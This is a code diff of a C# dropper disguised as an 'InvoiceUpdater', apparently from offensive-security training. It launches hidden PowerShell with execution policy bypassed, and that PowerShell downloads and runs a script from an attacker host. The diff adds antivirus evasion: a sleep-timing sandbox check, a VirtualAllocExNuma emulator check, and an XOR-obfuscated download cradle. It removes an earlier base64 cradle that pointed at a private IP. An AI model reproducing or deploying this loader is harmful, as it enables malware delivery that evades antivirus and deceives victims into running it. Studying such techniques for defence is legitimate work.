@@ -3,47 +3,76 @@
 //   Windows:  csc /target:exe /platform:x64 /out:payload.exe payload.cs
 //   Linux:    mcs -platform:x64 -out:payload.exe payload.cs
 //
-// Downloads run.txt from the C2 and IEX's it, same cradle as the DOC vector.
+// AV evasion layers (Mod 11.5.2, 11.6.1, 11.6.2):
+//   1. Emulator detection — Sleep + wall-clock delta
+//   2. Non-emulated API check — VirtualAllocExNuma returns null in AV emulators
+//   3. Caesar-ciphered cradle string — no static signature in the binary
+//
+// The base64 cradle decodes to:
+//   iex((new-object system.net.webclient).downloadstring('http://KALI/run.txt'))
 
 using System;
 using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Text;
 
 namespace InvoiceUpdater
 {
     class Program
     {
+        // --- Win32 imports for emulator detection ---
+        [DllImport("kernel32.dll")]
+        static extern void Sleep(uint dwMilliseconds);
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress,
+            uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetCurrentProcess();
+
+        // Ciphered base64 cradle. Each byte XOR 0x5A (arbitrary key).
+        // Regenerate with:
+        //   $cmd = "iex((new-object system.net.webclient)" +
+        //          ".downloadstring('http://KALI_IP/run.txt'))"
+        //   $b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
+        //   # then XOR each character code with 0x5A and dump as byte array
+        static byte[] ciphered = new byte[] {
+            // placeholder — replace with your ciphered cradle
+            0x00,0x00,0x00
+        };
+
         static void Main()
         {
-            // Base64-encoded PowerShell cradle. Regenerate with:
-            //   [Convert]::ToBase64String(
-            //       [Text.Encoding]::Unicode.GetBytes($cmd))
-            // where $cmd is:
-            //   iex((new-object system.net.webclient)
-            //       .downloadstring('http://192.168.119.120/run.txt'))
-            string encoded =
-                "KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBi" +
-                "AEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgA" +
-                "dAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAOQAuADEAMgAwAC8AcgB1AG4ALgB0" +
-                "AHgAdAAnACkAIAB8ACAASQBFAFgA";
+            // ── Layer 1: emulator detection ─────────────────────────────────
+            DateTime t1 = DateTime.Now;
+            Sleep(2000);
+            double delta = DateTime.Now.Subtract(t1).TotalSeconds;
+            if (delta < 1.5) return;   // sandbox fast-forwarded the Sleep
+
+            // ── Layer 2: non-emulated API check ────────────────────────────
+            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero,
+                0x1000, 0x3000, 0x04, 0);
+            if (mem == IntPtr.Zero) return;  // AV emulator doesn't implement this API
+
+            // ── Layer 3: decrypt cradle and run ────────────────────────────
+            StringBuilder sb = new StringBuilder(ciphered.Length);
+            for (int i = 0; i < ciphered.Length; i++)
+            {
+                sb.Append((char)(ciphered[i] ^ 0x5A));
+            }
+            string b64 = sb.ToString();
 
             ProcessStartInfo psi = new ProcessStartInfo
             {
                 FileName        = "powershell.exe",
-                Arguments       = "-exec bypass -nop -w hidden -enc " + encoded,
+                Arguments       = "-exec bypass -nop -w hidden -enc " + b64,
                 UseShellExecute = false,
                 CreateNoWindow  = true,
                 WindowStyle     = ProcessWindowStyle.Hidden
             };
 
-            try
-            {
-                Process.Start(psi);
-            }
-            catch
-            {
-                // Swallow — the process may be blocked by AppLocker or AV.
-                // In a real engagement you would log and pivot to a fallback.
-            }
+            try { Process.Start(psi); } catch { }
         }
     }
 }
